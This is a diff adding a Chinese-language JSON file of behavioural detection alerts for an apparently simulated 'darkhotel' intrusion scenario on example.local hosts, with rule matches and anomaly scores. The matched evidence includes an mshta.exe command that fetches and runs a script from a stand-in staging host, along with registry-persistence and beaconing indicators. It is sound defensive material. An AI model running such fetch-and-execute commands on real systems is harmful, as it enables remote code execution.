@@ -1,0 +1,486 @@
+[
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00001",
+    "alert": "检测到注册表自启动/劫持",
+    "confidence_score": 0.6709,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "注册表自启动/劫持",
+          "description": "检测通过注册表启动项或劫持位置建立持久化的行为。",
+          "match_reason": "type=registry value=hklm\\software\\microsoft\\windows\\currentversion\\run\\securityhealthsystray"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在43130.3秒内产生3条直接观测；覆盖1类关系（registry）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.642，传播分=0.642；边关系惊异度=0.760, 主机内行为稀有度=0.577。"
+    },
+    "location": {
+      "physical_record_id": "pr-fd32693b1511abfca63beedf",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 193,
+      "timestamp": "2015-12-31T05:28:16.1637052Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00002",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/health\""
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-65b2716eebcc1b251eab6893",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 502,
+      "timestamp": "2015-12-31T06:38:52.185000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00003",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/health\""
+        }
+      ],
+      "graph_reason": "同一主机、同一process身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_security），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-964f4a77ae0f335c17794f5e",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_security.xml",
+      "record_index": 224,
+      "timestamp": "2015-12-31T06:38:52.8280003Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00004",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/health\""
+        }
+      ],
+      "graph_reason": "同一主机、同一process_guid身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-82d53aa9317eb1c02506c1ba",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 232,
+      "timestamp": "2015-12-31T06:38:52.8721849Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00005",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/api/v1/check\""
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-c5b6a029491f6382d0162706",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 655,
+      "timestamp": "2015-12-31T07:47:12.178000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00006",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/api/v1/check\""
+        }
+      ],
+      "graph_reason": "同一主机、同一process_guid身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-b89fddb5bb6c924fc5481d59",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 292,
+      "timestamp": "2015-12-31T07:47:12.6382184Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00007",
+    "alert": "检测到脚本下载或内存执行链",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本下载或内存执行链",
+          "description": "检测脚本从网络获取内容并继续执行或载入内存的行为链。",
+          "match_reason": "powershell.exe -NonInteractive -Command \"Invoke-RestMethod -Uri https://internal-api.corp.local/api/v1/check\""
+        }
+      ],
+      "graph_reason": "同一主机、同一process身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_security），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-ad331651c868d09a9f8b8553",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_security.xml",
+      "record_index": 308,
+      "timestamp": "2015-12-31T07:47:12.8520004Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00008",
+    "alert": "检测到周期性网络信标",
+    "confidence_score": 0.8218,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "周期性网络信标",
+          "description": "检测具有稳定时间间隔或重复通信特征的周期性网络信标。",
+          "match_reason": "proc:lnx-srv-015:c764875d-b479-4376-9175-44de488960dc -> net:185.199.110.133:443; n=5 mean=7280.8s cv=0.182"
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（connect）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.768，传播分=0.768；边关系惊异度=0.580, 主机内行为稀有度=0.447。"
+    },
+    "location": {
+      "physical_record_id": "pr-fbf7f8384109c70cac34e4ef",
+      "relative_path": "LNX-SRV-015.example.local/ecar.json",
+      "record_index": 624,
+      "timestamp": "2015-12-31T08:35:35.785000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00009",
+    "alert": "检测到PowerShell/脚本编码命令",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "PowerShell/脚本编码命令",
+          "description": "检测 PowerShell 或其他脚本解释器使用编码参数执行命令的行为。",
+          "match_reason": "powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAYwBvAGQAZQA="
+        }
+      ],
+      "graph_reason": "同一主机、同一process_guid身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-35d2b49bc6ed1504787540ef",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 389,
+      "timestamp": "2015-12-31T09:38:37.3520867Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00010",
+    "alert": "检测到PowerShell/脚本编码命令",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "PowerShell/脚本编码命令",
+          "description": "检测 PowerShell 或其他脚本解释器使用编码参数执行命令的行为。",
+          "match_reason": "powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAYwBvAGQAZQA="
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-3f0b9ad559e563cd4c64a82d",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 900,
+      "timestamp": "2015-12-31T09:38:37.549000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00011",
+    "alert": "检测到PowerShell/脚本编码命令",
+    "confidence_score": 0.8589,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "PowerShell/脚本编码命令",
+          "description": "检测 PowerShell 或其他脚本解释器使用编码参数执行命令的行为。",
+          "match_reason": "powershell.exe -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAYwBvAGQAZQA="
+        }
+      ],
+      "graph_reason": "同一主机、同一process身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_security），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.826，传播分=0.826；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-92ebc9f59eed9ed2c7719ac4",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_security.xml",
+      "record_index": 449,
+      "timestamp": "2015-12-31T09:38:37.8940008Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00012",
+    "alert": "检测到用户可写目录执行",
+    "confidence_score": 0.7139,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "用户可写目录执行",
+          "description": "检测从用户可写目录启动可执行文件或脚本的行为。",
+          "match_reason": "C:\\Users\\fang.li\\AppData\\Local\\Temp\\vs_installer.exe"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在56466.8秒内产生126条直接观测；覆盖1类关系（spawn）和3类遥测（ecar、windows_event_security、windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.714，传播分=0.714；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-4333feca0163ee1faedae46e",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 471,
+      "timestamp": "2015-12-31T10:19:54.8417782Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00013",
+    "alert": "检测到MSHTA 脚本执行",
+    "confidence_score": 0.8742,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "MSHTA 脚本执行",
+          "description": "检测通过 mshta.exe 载入或执行脚本内容的行为。",
+          "match_reason": "C:\\Windows\\System32\\mshta.exe http://darkhotel-stage.training.test/image/read.php"
+        }
+      ],
+      "graph_reason": "同一主机、同一process身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_security），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.850，传播分=0.850；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-0b1f47819529ca61e013a6c9",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_security.xml",
+      "record_index": 577,
+      "timestamp": "2015-12-31T10:21:26.3451704Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00014",
+    "alert": "检测到MSHTA 脚本执行",
+    "confidence_score": 0.8742,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "MSHTA 脚本执行",
+          "description": "检测通过 mshta.exe 载入或执行脚本内容的行为。",
+          "match_reason": "C:\\Windows\\System32\\mshta.exe http://darkhotel-stage.training.test/image/read.php"
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.850，传播分=0.850；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-f54c9984723af8f028fb0b98",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 1080,
+      "timestamp": "2015-12-31T10:21:26.976000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00015",
+    "alert": "检测到MSHTA 脚本执行",
+    "confidence_score": 0.8742,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "MSHTA 脚本执行",
+          "description": "检测通过 mshta.exe 载入或执行脚本内容的行为。",
+          "match_reason": "C:\\Windows\\System32\\mshta.exe http://darkhotel-stage.training.test/image/read.php"
+        }
+      ],
+      "graph_reason": "同一主机、同一process_guid身份在0.0秒内产生1条直接观测；覆盖1类关系（spawn）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.850，传播分=0.850；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-10272f0061e63df89dc185b6",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 475,
+      "timestamp": "2015-12-31T10:21:27.1132952Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00016",
+    "alert": "检测到脚本/LOLBin 外联",
+    "confidence_score": 0.9105,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本/LOLBin 外联",
+          "description": "检测脚本解释器或常见系统工具发起的异常网络连接。",
+          "match_reason": "mshta.exe -> 159.65.43.201:80"
+        }
+      ],
+      "graph_reason": "同一主机、同一process身份在0.0秒内产生1条直接观测；覆盖1类关系（connect）和1类遥测（windows_event_security），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.907，传播分=0.907；边关系惊异度=0.580, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-0a7c02c99c0828cc9cb83878",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_security.xml",
+      "record_index": 579,
+      "timestamp": "2015-12-31T10:21:35.3991804Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00017",
+    "alert": "检测到脚本/LOLBin 外联",
+    "confidence_score": 0.9105,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本/LOLBin 外联",
+          "description": "检测脚本解释器或常见系统工具发起的异常网络连接。",
+          "match_reason": "mshta.exe -> 159.65.43.201:80"
+        }
+      ],
+      "graph_reason": "同一主机、同一process_guid身份在0.0秒内产生1条直接观测；覆盖1类关系（connect）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.907，传播分=0.907；边关系惊异度=0.580, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-235a9b910816e356120030b9",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 477,
+      "timestamp": "2015-12-31T10:21:35.7232618Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00018",
+    "alert": "检测到脚本/LOLBin 外联",
+    "confidence_score": 0.8846,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "脚本/LOLBin 外联",
+          "description": "检测脚本解释器或常见系统工具发起的异常网络连接。",
+          "match_reason": "mshta.exe -> 159.65.43.201:80"
+        }
+      ],
+      "graph_reason": "同一主机、同一actor_id身份在0.0秒内产生1条直接观测；覆盖1类关系（connect）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.867，传播分=0.867；边关系惊异度=0.580, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-6cb8b613462e1b7824beeda3",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 1083,
+      "timestamp": "2015-12-31T10:21:36.431000Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00019",
+    "alert": "检测到高熵/超长 DNS 查询",
+    "confidence_score": 0.7900,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "高熵/超长 DNS 查询",
+          "description": "检测长度、字符分布或编码特征异常的 DNS 查询，识别潜在隧道或隐蔽通信。",
+          "match_reason": "126.205.101.151.in-addr.arpa"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在49090.1秒内产生87条直接观测；覆盖1类关系（dns）和1类遥测（zeek_dns），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.790，传播分=0.790；边关系惊异度=0.550, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-6234997556c83a82dc3b9389",
+      "relative_path": "ZEEK-ZEEK-SENSOR-01/dns.json",
+      "record_index": 481,
+      "timestamp": "2015-12-31T11:06:34.580845Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00020",
+    "alert": "检测到高熵/超长 DNS 查询",
+    "confidence_score": 0.7516,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "高熵/超长 DNS 查询",
+          "description": "检测长度、字符分布或编码特征异常的 DNS 查询，识别潜在隧道或隐蔽通信。",
+          "match_reason": "240.221.184.93.in-addr.arpa"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在30024.1秒内产生19条直接观测；覆盖1类关系（dns）和1类遥测（windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.752，传播分=0.752；边关系惊异度=0.550, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-3a64a73c32fa76822edc8284",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 608,
+      "timestamp": "2015-12-31T11:06:34.8221909Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00021",
+    "alert": "检测到系统/网络发现命令",
+    "confidence_score": 0.6181,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "系统/网络发现命令",
+          "description": "检测执行账号、主机、网络配置或其他环境发现命令的行为。",
+          "match_reason": "cmd.exe /c tasklist /svc"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在0.8秒内产生3条直接观测；覆盖1类关系（spawn）和3类遥测（ecar、windows_event_security、windows_event_sysmon），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.618，传播分=0.618；边关系惊异度=0.720, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-be7e14d3bc7058ed471a74ef",
+      "relative_path": "WKS-EXEC-015.example.local/windows_event_sysmon.xml",
+      "record_index": 1395,
+      "timestamp": "2015-12-31T16:28:47.0364685Z"
+    }
+  },
+  {
+    "alert_id": "BA-2015-12-31-darkhotel-00022",
+    "alert": "检测到可写目录模块加载",
+    "confidence_score": 0.9107,
+    "alert_reason": {
+      "rules": [
+        {
+          "rule_name": "可写目录模块加载",
+          "description": "检测进程从用户可写或其他高风险目录加载模块的行为。",
+          "match_reason": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24010.12-0\\MpClient.dll"
+        }
+      ],
+      "graph_reason": "同一主机上的同类行为在46391.9秒内产生5条直接观测；覆盖1类关系（load）和1类遥测（ecar），因此聚合为一个可独立调查的行为告警。",
+      "anomaly_reason": "自监督图模型判定该事件相对无标签行为基线存在偏离：异常分=0.907，传播分=0.907；边关系惊异度=0.690, 主机内行为稀有度=1.000。"
+    },
+    "location": {
+      "physical_record_id": "pr-57ed5ea412224661e8856f14",
+      "relative_path": "WKS-EXEC-015.example.local/ecar.json",
+      "record_index": 3173,
+      "timestamp": "2015-12-31T17:54:15.625000Z"
+    }
+  }
+]
